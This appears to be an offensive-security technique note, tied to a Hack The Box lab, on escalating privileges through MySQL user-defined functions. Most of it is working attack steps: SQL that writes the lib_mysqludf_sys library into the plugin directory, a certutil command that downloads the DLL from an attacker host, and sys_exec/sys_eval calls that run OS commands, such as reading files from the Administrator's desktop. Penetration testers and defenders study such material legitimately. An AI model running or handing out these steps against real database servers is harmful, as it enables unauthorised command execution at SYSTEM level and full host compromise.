# MySQL UDF Privilege Escalation

## When to use

- MySQL/MariaDB access with FILE privilege or root credentials
- MySQL service runs as a privileged account (LocalSystem, root, or service account)
- Plugin directory is writable (or you can write to it via an alternative path)
- Goal: execute OS commands as the MySQL service account

## Tags

- ATT&CK: T1068 (Exploitation for Privilege Escalation), T1059 (Command and Scripting Interpreter)
- Platform: Windows, Linux
- Services: MySQL 5.x/8.x, MariaDB
- Privileges: MySQL root or FILE privilege

## How it works

MySQL User Defined Functions (UDF) allow loading shared libraries (.dll on Windows,
.so on Linux) that expose custom SQL functions. The `lib_mysqludf_sys` library provides
`sys_exec()` and `sys_eval()` which execute OS commands in the context of the MySQL
service account.

## Prerequisites

Check the plugin directory and its permissions:

```sql
SHOW VARIABLES LIKE 'plugin_dir';
-- Windows: C:\MySQL\lib\plugin\ or C:\Program Files\MySQL\...\lib\plugin\
-- Linux: /usr/lib/mysql/plugin/ or /usr/lib64/mysql/plugin/
```

Check `secure_file_priv`:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
-- NULL = INTO DUMPFILE disabled entirely
-- '' (empty) = no restriction
-- /path/ = restricted to that directory
```

## Getting the UDF library onto target

### Method 1: INTO DUMPFILE (requires secure_file_priv = '' or matching path)

```sql
SELECT UNHEX('<hex blob>') INTO DUMPFILE '<plugin_dir>/lib_mysqludf_sys.dll';
```

The hex blob comes from sqlmap: `data/udf/mysql/<os>/<arch>/lib_mysqludf_sys.dll_`
(XOR-encoded, decode with `python3 extra/cloak/cloak.py -d -i lib_mysqludf_sys.dll_`).

### Method 2: certutil download (Windows, when secure_file_priv = NULL)

From an OS shell (kiosk escape, webshell, etc.):

```cmd
certutil -urlcache -split -f http://<attacker>/lib_mysqludf_sys.dll C:\MySQL\lib\plugin\lib_mysqludf_sys.dll
```

### Method 3: Direct file copy (if plugin dir is writable from your shell)

```bash
cp lib_mysqludf_sys.so /usr/lib/mysql/plugin/
```

## Creating and using the function

```sql
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.dll';
-- Or on Linux:
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';

-- Execute commands
SELECT sys_exec('whoami > C:\Users\Public\whoami.txt');
SELECT sys_exec('cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\root.txt');
```

`sys_eval()` returns command output directly:

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.dll';
SELECT sys_eval('whoami');
```

## Operational notes

**Service account matters.** On Windows, MySQL as `LocalSystem` gives SYSTEM access.
On Linux, MySQL typically runs as the `mysql` user (low privilege). Check with
`SELECT @@version_compile_os; SELECT USER();` and verify the process owner.

**Plugin dir permissions.** On hardened systems, the plugin directory is only writable
by the MySQL service account. If you only have SQL access (no OS shell), you need
`INTO DUMPFILE` to write the file. If `secure_file_priv = NULL`, you need an OS-level
write method.

**MySQL 8.0+ authentication.** Default auth plugin changed to `caching_sha2_password`.
Older MySQL clients may fail to connect. Use `--default-auth=mysql_native_password`
or `ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '<pass>'`.

## Cleanup

```sql
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;
-- Then delete the DLL/SO from the plugin directory
```

## Proven on

- MySQL 8.0.42 on Windows 11 as LocalSystem (HTB Touch, 2026-10-03): certutil download of UDF DLL, sys_exec for flag read
